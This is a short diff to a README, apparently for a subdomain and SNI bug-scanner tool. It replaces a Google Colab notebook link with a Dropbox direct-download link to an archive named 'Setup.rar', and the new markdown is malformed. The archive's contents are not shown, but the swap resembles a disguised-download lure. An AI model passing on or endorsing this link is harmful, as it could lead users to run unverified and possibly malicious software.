@@ -7,7 +7,7 @@ One-click tool for deep search Subdomain and Bug or working SNI
 #   အောက်က colab link ကနေ Run ပါ
 
 
-[![link](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/victorgeel/Sub-BugSNI/blob/main/Bugscanner.ipynb)
+[![link](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1)
 
 
 Victor Geek
